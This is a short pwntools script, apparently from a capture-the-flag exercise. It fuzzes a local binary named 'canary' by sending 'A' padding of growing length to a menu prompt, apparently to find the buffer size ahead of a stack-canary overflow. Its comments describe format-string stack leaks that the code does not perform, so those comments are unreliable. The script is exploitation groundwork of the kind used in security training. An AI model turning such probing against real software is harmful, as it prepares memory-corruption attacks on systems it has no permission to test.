from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF("./canary", checksec=False)

# Let's fuzz x values
for i in range(1000):
    try:
        # Create process (level used to reduce noise)
        p = process(level="error")
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        p.recvuntil(":")
        p.sendline(b"1")
        p.recvuntil(":")
        p.sendline("A" * i)
        print(p.recvline())
        # Receive the response
        result = p.recvline().decode()
        # If the item from the stack isn't empty, print it
        if result:
            print(str(i) + ": " + str(result).strip())
    except EOFError:
        pass
